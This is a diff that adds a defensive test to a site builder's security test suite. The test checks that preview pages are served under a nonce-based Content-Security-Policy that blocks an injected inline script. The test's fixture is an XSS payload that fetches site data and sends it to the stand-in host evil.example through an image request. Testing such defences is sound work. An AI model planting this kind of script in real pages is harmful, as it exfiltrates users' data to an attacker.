@@ -140,6 +140,37 @@ describe('preview path traversal + asset containment', () => {
     expect(res.headers['content-security-policy']).toContain("default-src 'none'");
     expect(res.headers['x-content-type-options']).toBe('nosniff');
   });
+
+  it('serves preview HTML under a nonce CSP that blocks an htmlEmbed <script>', async () => {
+    const siteId = await makeSite();
+    const home = (await app.inject({ url: `/sites/${siteId}/pages` })).json() as Array<{ id: string; rootId: string }>;
+    // Inject an htmlEmbed carrying a hostile inline script (renders verbatim).
+    const evil = `<script>fetch('/sites').then(r=>r.text()).then(t=>new Image().src='https://evil.example/x?'+t)</script>`;
+    await app.inject({
+      method: 'POST',
+      url: `/sites/${siteId}/pages/${home[0]!.id}/tree/ops`,
+      payload: { ops: [{ op: 'insert', parentId: home[0]!.rootId, node: { type: 'htmlEmbed', props: { html: evil } } }] },
+    });
+
+    const res = await app.inject({ url: `/preview/${siteId}/` });
+    expect(res.statusCode).toBe(200);
+    const csp = res.headers['content-security-policy'] as string;
+    expect(res.headers['x-content-type-options']).toBe('nosniff');
+    // A per-response nonce governs script-src; no 'unsafe-inline'.
+    const scriptSrc = csp.split(';').map((d) => d.trim()).find((d) => d.startsWith('script-src'))!;
+    const nonce = scriptSrc.match(/'nonce-([^']+)'/)?.[1];
+    expect(nonce, csp).toBeTruthy();
+    // script-src must NOT allow inline (nonce only), or the hostile script runs.
+    expect(scriptSrc).not.toContain("'unsafe-inline'");
+    expect(csp).toContain("frame-ancestors 'self'");
+    // The injected hostile script is present in the body but carries NO nonce,
+    // so the browser refuses to execute it.
+    expect(res.body).toContain(evil);
+    expect(res.body).not.toContain(`nonce="${nonce}"><script`); // sanity
+    // The exact hostile <script> tag has no nonce attribute on it.
+    const hostileTag = res.body.slice(res.body.indexOf('<script>fetch'));
+    expect(hostileTag.startsWith('<script>')).toBe(true); // bare <script>, unnonced
+  });
 });
 
 describe('input validation hardening', () => {
